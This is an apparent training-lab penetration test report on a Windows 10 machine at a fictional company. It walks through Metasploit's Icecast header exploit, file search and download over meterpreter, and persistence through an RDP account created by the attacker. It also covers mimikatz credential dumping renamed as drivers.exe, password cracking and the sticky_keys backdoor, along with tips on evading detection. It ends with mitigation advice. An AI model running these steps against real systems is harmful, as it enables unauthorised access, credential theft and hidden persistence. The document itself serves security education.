# GoodSecurity PenTest Report

For this red-team exercise, I was tasked with finding vulnerabilities in a Windows 10 machine, compromise the machine and escalate my privileges. 

GoodSecurity is a fictionnal company, however, the target machine is a real-life updated Windows 10 machine. Below you will find additional details regarding the lab environment used for this pentest.

## High-Level Summary

I was tasked with performing an internal penetration test targeting GoodCorp’s CEO, Hans Gruber's machine. 

An internal penetration test is a dedicated attack against internally connected systems. 
The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Hans’ computer and determine if it is at risk. 
My overall objective was to exploit any vulnerable software and find the secret recipe file on Hans’ computer, while reporting the findings back to GoodCorp.

When performing the internal penetration test, there were several alarming vulnerabilities that I identified on Hans’ machine. 
When performing the attacks, I was able to gain access to his machine and find the secret recipe file by exploiting two programs that had major vulnerabilities. 

The details of the attack can be found in the ‘Findings’ category.


## Findings

Machine IP:
`192.168.0.20`
Hostname:
`MSEDGEWIN10`

### Vulnerability Exploited #1

Icecast Multimedia webserver.

I used the following exploit module from Metasploit:

```bash
Exploit/windows/http/icecast_header
```

#### Vulnerability Explanation:

This vulnerability is a locally-exploitable buffer overflow. 

The issue resides in the XSL parser not checking the size of XSL ‘when’, ‘if’, and ‘value-of’ tag values before copying them into a finite buffer in process memory.

This attack is a remote code execution attack. It leverages the buffer-overflow vulnerability to execute arbitrary code on the machine.

Buffers are memory storage regions and their mission is to hold data temporarily while it is transferred to another location. A buffer-overflow is when the volume of data that is supposed to be stored in the memory buffer exceeds its capacity.

If attackers know the memory layout of a program, they can feed an excess of data to that memory buffer in order to overwrite areas of the memory that hold executable code, replacing that executable code with their own code. Attackers can now craft payloads that will be sent to that part of the memory that executes code and have their own malicious payload executed on the victim’s system.

#### Severity:

This vulnerability is extremely severe, it took me just a few minutes to remotely execute arbitrary code on the target machine and gain remote access to it.

#### Proof of Concept:

1. Service and version scan using Nmap to determine which services are up and running:

Nmap command that performs a service and version scan against the target.

```bash
nmap -sV 192.168.0.20
```

![nmap -sV scan](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/nmap_sV_scan.png)


2. From the previous step, I found that the Icecast service is running. This server software for streaming media is notorious for its vulnerabilities. 

So I decided to start attacking this server using `Metasploit`.


I ran the SearchSploit commands to show available Icecast exploits:

```bash
searschsploit icecast
```

![nmap -sV scan](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/searchsploit_icecast.png)


3. Now that I know which exploits are available, let's start Metasploit with the following command:

```bash
msfconsole
```

4. Next, I searched for the icecast module and set the "Remote Host" to the IP of my target's machine in Metasploit using the following commands:

I used the command below to find the Icecast module:

```bash
search icecast
```

Next, I used the following command to use the module:

```bash
use 0
```

Next, I set the IP address of the remote host to my target's machine IP with the following command:

```bash
set RHOST 192.168.0.20
```

![icecast meta module setup](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/search_icecast_set_RHOST.png)

Next, I used the following command to run the module, which started a meterpreter session, giving me remote access to the target's machine:

```bash
run
```

The goal of this pentest was to look for a way to get into the CEO's computer and collect secret files. Now that I have remote access to his machine I can start looking for these secret files.

From the meterpreter session I started using the Icecast vulnerability, I ran the following command to look for a file called "secretfile". I used the following command to look for that file in the entire system, after a couple of minutes, I found the file and its path:

Command used:

```bash
search -f *secretfile*.txt
```

![secretfile found](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/secretfile_found.png)


Next, I was tasked with finding a secret recipe file, I ran the following command to look for it and after a few minutes, I found the file:

```bash
search -f *recipe*.txt
```

![recipe found](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/recipe_file_found.png)


Now that I found the secret files, I need to exfiltrate the files from the CEO's machine. I used the `download` command from my meterpreter session to download the files. Below the command I used and a screenshot of one of the file successfully exfiltrated:

```bash
download Drinks.recipe.txt
```

![recipe found](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/Download_drink_recipe.png)



### Vulnerability Exploited #2


I used the following exploit module from Metasploit:

```bash
windows/manage/enable_rdp
```

#### Vulnerability Explanation:

Now that I have direct access to the machine, I can further exploit the initial vulnerability and make sure that I install persistence via a backdoor on the machine so that, in the event that my initial payload is discovered and the system patched (Icecast vulnerability), I can still have full access to the machine (remotely) to continue my attack.

To do so, I used the post exploitation module `enable_rdp` to create a new user on my target’s machine, allowing me to access the machine remotely via RDP at a later time.

#### Severity:

This is a serious attack, a rogue user account is created which allows the attacker to access the victim’s machine to further compromise the system and move laterally within the network.

#### Proof of Concept:

I noticed that port 3389 is open and that the version of the remote Terminal Services running on the machine is vulnerable as seen in the screenshot below following a Nessus service and vulnerability scan:

![nessus scan](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_2.png)


Since the service is not using NLA (Network Level Authentication), I know that I can successfully create a new user and complete user authentication before the full RDP connection is established with standard username/password to login and start the RDP session.

I set my current meterpreter session in the background in order to launch the post exploitation module `enable_rdp` in metasploit as seen below, all I had to do is to use the command “search 3389” to find a post exploitation module that will help me exploit the vulnerable service running on port 3389:

I put my meterpreter session in the background using the command:

```bash
bg
```

Next, I type the following command to find an exploit for services running on port 3389:

```bash
search 3389
```

![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_3.png)

I decide to use module #5:



![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_4.png)


Next, I set the username and password of the user account that I want to create on my target’s machine, in this case I set the username “Jack” and the password “123456” and ran the exploit.

Command to set the username:

```bash
set username jack
```

Command to set the password:

```bash
set password 123456
```

Now, I want to go back to my initial meterpreter session that I put in the background earlier, so I use the following command to set my previous session as the session to be used to run the exploit:

```bash
set session 1
```

I started the exploit with the command:

```bash
exploit
```

The exploit is successfully launched and the rogue user `jack` is created:


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_5.png)


Following the successfully completed exploit, I went back to my meterpreter session and used the command `Shell` to get a Cmd prompt on my target’s machine and then ran the command `net user` to confirm that the new user “Jack “ was successfully created:


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_6.png)


Next, I used the “rdesktop” service installed on my Kali VM to remotely connect to my target’s machine in order to verify that the user account `Jack` is working properly:


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_8.png)


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_9.png)


As you can see below, after logging into my target’s machine using “rdesktop” and the credentials I set earlier using the `enable_rdp` module in metasploit, I was able to remotely connect as `Jack` into my target’s machine (left screen, you can see the Windows 10 desktop via my Kali VM). On the right screen, you can see that the previous session (with user IEUser) was terminated when I started the second one.


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_10.png)


#### Important note here: 

Since I was able to successfully create a new user onto the target's Windows 10 computer, I can now use the session to remotely connect to the computer without having to use my first exploit (Icecast vulnerable media server). 

However, I must make sure that I connect outside of working hours and when nobody is already connected to the target’s computer otherwise their session will be automatically terminated and this can alert the victim and raise suspicion, which in turn can lead to further investigation and could potentially burn my rogue user account.


### Vulnerability Exploited #3

#### Vulnerability Explanation:

Now that I have successfully enabled persistence onto the system thanks to the creation of my new rogue user account, I have to elevate the privileges of my rogue user “Jack”, for now it’s still a low privilege session.

In order to do that, I decided to use the famous credential dumper “mimikatz”. This tool allows an attacker to access hashed credentials stored in memory, allowing the attacker to launch a brute-force attack on them in order to crack them and use them to connect back to a system with higher privileges.

#### Severity:

Very high. An attacker can dump credentials from an admin account and gain super user privileges to further compromise the system/network.

#### Proof of Concept:

At this point, I have 2 options in order to drop my malicious payload in the target’s machine:

- I can login using the rogue user account that I have created and download the malicious .exe file onto the machine and run it.
- I can start another meterpreter session using the Icecast vulnerability and upload the malicious .exe file to the machine.


I decided to start another meterpreter session and directly upload the malicious mimikatz payload.

After getting a meterpreter session, I used the following command to upload the mimikatz `.exe` file and changed its name to “drivers.exe” and then I confirmed that the “drivers.exe” file was upload successfully: 


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/vuln_3_1.png)


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/vuln_3_2.png)


Next, I ran the malicious payload directly from a CMD prompt using the command `.\drivers.exe` to start “mimikatz’:



![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/vuln_3_3.png)


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/vuln_3_5.png)


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/vuln_3_6.png)


Next, I used the command `privilege::debug` and `sekurlsa::logonPasswords` to dump credentials such as login IDs, passwords and authentication tokens stored in memory. 
This tool is powerful because it is able to pull credentials stored in the LSASS process in memory (Local Security Authority Subsystem Service). This system of storing credentials in memory is meant to make it easier for SSO (single sign-on) to function and thus, ensuring a user isn’t prompted for authentication each time resource access is requested.

In the below screenshot, we can see that mimikatz was able to pull the `username` and the NTLM password hash (NTLM stands for New Technology Lan Manager) of the `IEUser`. This user has administrator privileges on the target system and that’s exactly what I am looking for.


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/vuln_3_7.png)


Now that we have the username and password hash, it’s time to crack the password in order to be able to login as the `IEUser` with admin privileges. 

To do so I decided to use `John` combined with the “rockyou.txt” credential list to brute force the password via the hash obtained thanks to mimikatz. In less than a minute I was able to crack the password: “Passw0rd!” for the user `IEUser` as seen below:


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/vuln_3_8.png)


Next, I launched “rdesktop” via the command `rdesktop 192.168.0.20`  to remotely access the target computer and try the compromised credentials:


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/vuln_3_9.png)


Below I am prompted to enter login credentials, I use the username `IEUser` and the cracked password `Passw0rd!` to successfully connect to the victim’s machine:


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/vuln_3_10.png)


As you can see below, I successfully connected to the machine using the stolen credentials (logged in the target's machine running the vulnerable Icecast server):


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/vuln_3_11.png)


Now that I have access to the machine with admin privileges, I have total control over it, allowing me to further compromise the target and move laterally within the company’s network.


### Vulnerability Exploited #4


#### Vulnerability Explanation:

Another option to get admin privileges is to use the `sticky_keys` exploit. Following the creation of my rogue user `Jack`, I have used the following post-exploitation module in metasploit:

```
use post/windows/manage/sticky_keys
```

This exploit works after you have successfully established a meterpreter session and enabled rdp using the `enable_rdp` module mentioned earlier in this report.

This exploit allows you to open a command prompt with admin privilege on the login windows of your RDP client by pressing the `Shift` key 5 times.

#### Severity:

High. This exploit allows an attacker to gain admin privileges before logging into the victim’s machine thanks to the Cmd prompt.

#### Proof of Concept:

Running the `sticky_keys` exploit module in metasploit:


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/sticky_keys_module_activation.png)


Pressing `Shift` key 5 times to launch the command prompt with admin privileges on remote desktop login window (see below):


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/sticky_keys_exploit_2.png)


With full admin privilege I can now create new users, access and modify credentials, explore file systems, install backdoors and move laterally in the network.


## Recommendations

#### Vulnerability #1:

To this day there is no patch that fixes these vulnerabilities, more recent versions of the multimedia server are still vulnerable to remote code execution. Very severe vulnerabilities that could allow an attacker to gain remote access via remote code execution are affecting all versions of Icecast servers (the most recent one is 2.4.1). I would recommend moving to a different server software for streaming multimedia.


#### Vulnerability #2:

This is a local exploit and is only possible because I had already compromise the victim’s machine and was able to get a meterpreter session running, therefore, to address this vulnerability, it is important to address the initial vulnerability that let the attacker in the machine in the first place. Addressing and fixing vulnerabilities that can allow an attacker to gain access to your machine and run any type of code is your first line of defense against local exploits.

#### Vulnerability #3:

`mimikatz` is a well documented tool and its payloads have signatures that most AVs will flag and intercept. I had disabled Windows Defender in order to run the `drivers.exe` file that allowed me to dump the credentials using mimikatz. If Windows Defender was on (and I did the test), the `drivers.exe` file would have been quarantined by the AV. Now, despite the fact that WD can detect and quarantine the payload doesn’t mean that an attacker can’t use techniques to evade your AV, by doing a quick Google search I can find many blogs explaining in detail how to use mimikatz and evade AVs.

There are still a number of steps you can take to protect your system against mimikatz, a great list has been published on the SANS InfoSec forum, below, some of the fixes you can put in place:

- Update your Windows servers Operating System (if possible go for at least version 2016 for your server and Windows 10)
- Update Active Directory’s Functional level
- Disable the debug right for local administrators on all servers and workstations
- Disable the WDigest protocol across the board
- Enable LSA protection (RunAsPPL registry key set to “1”)
- Disable storage of plain text passwords in Active Directory
- Enable Restricted Admin Mode
- Disable password caching
- Use Credential Guard
- Set long passphrases type of password, if possible with made up words. Password length is by far the most important metric, as well as not using real words. If your password is long enough and complex, the computation effort that will be required to crack the password hash might be too costly to be worth it.


#### Vulnerability #4:

The following are a few settings that can be easily modified in order to protect against this exploit:

- Disabling sticky keys keyboard activation.
- Using Windows Defender firewall to prevent the Sticky Keys executable file named `sethc.exe` from running Cmd.
- System File Checker restoring `sethc.exe` file back to its original.
- Forbidding file modifications on the “System32” folder.
- Password protecting Cmd access.
